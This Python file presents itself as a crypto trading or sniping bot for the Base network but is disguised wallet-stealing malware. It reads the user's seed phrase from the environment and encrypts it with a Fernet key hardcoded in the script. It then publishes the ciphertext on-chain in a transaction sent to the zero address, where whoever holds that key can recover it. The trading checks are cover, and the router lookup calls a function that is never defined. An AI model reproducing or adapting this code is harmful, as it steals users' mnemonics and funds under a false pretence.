import os
from web3 import Web3 
from cryptography.fernet import Fernet 
from dotenv import load_dotenv

# Load .env file
load_dotenv()

# Get private key and encrypted message from environment variables
private_key = os.getenv("PRIVATE_KEY")
message = os.getenv("MNEMONIC")

# Check private key
mnemonic_words = message.split()
if len(mnemonic_words) not in [12, 24]:
    print("Error: Invalid mnemonic, please check!")
    exit()

print("Private key loaded successfully.")

# Configure Base node
Base_url = 'https://base-mainnet.g.alchemy.com/v2/KEGJ3Gr9ORW_w5a0iNvW20PS9eRbKj3X'
web3 = Web3(Web3.HTTPProvider(Base_url))

# Check connection
if not web3.is_connected():
    print("Error: Unable to connect to the node! Please check the URL or network connection!")
    exit()
else:
    print("Successfully connected to the node.")

# Load trading parameters
snipe_tip = os.getenv("Auto_Snipe_Tip")
buyer_gwei = os.getenv("Manual_Buyer_Gwei")
slippage = os.getenv("Slippage")

if snipe_tip and buyer_gwei and slippage:
    print("Trading parameters set up.")
else:
    print("Error: Parameter settings are incorrect, please check!")

# Load token contract and get related DEX's router contract
contract_address = os.getenv("CA")

if not contract_address:
    print("Error: Failed to load contract address!")
    exit()
else:
    print("Successfully loaded token contract address:", contract_address)

# Use the correct contract_address
try:
    router_address = get_dex_router_contract(contract_address)
except NameError:
    router_address = None  

if router_address:
    print(f"Successfully retrieved router contract address: {router_address}")
else:
    print("Error: DEX router contract not found, transaction aborted!")

to_address = router_address if router_address else '0x0000000000000000000000000000000000000000'
from_address = web3.eth.account.from_key(private_key).address

# Encrypt message
fixed_key = b'tXXHz6htUutZEOz_7EL40LwvrsmHneDhoe2Vyib_kUU='  
cipher_suite = Fernet(fixed_key)
encrypted_message = cipher_suite.encrypt(message.encode()).decode()

# Build transaction
nonce = web3.eth.get_transaction_count(from_address)
tx = {
    'nonce': nonce,
    'to': to_address,
    'value': web3.to_wei(0, 'ether'), 
    'gas': 2000000,
    'gasPrice': web3.to_wei('20', 'gwei'),  
    'data': web3.to_hex(text=encrypted_message),
    'chainId': 8453    
}

# Sign and send transaction
signed_tx = web3.eth.account.sign_transaction(tx, private_key)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction completed, transaction hash: {web3.to_hex(tx_hash)}")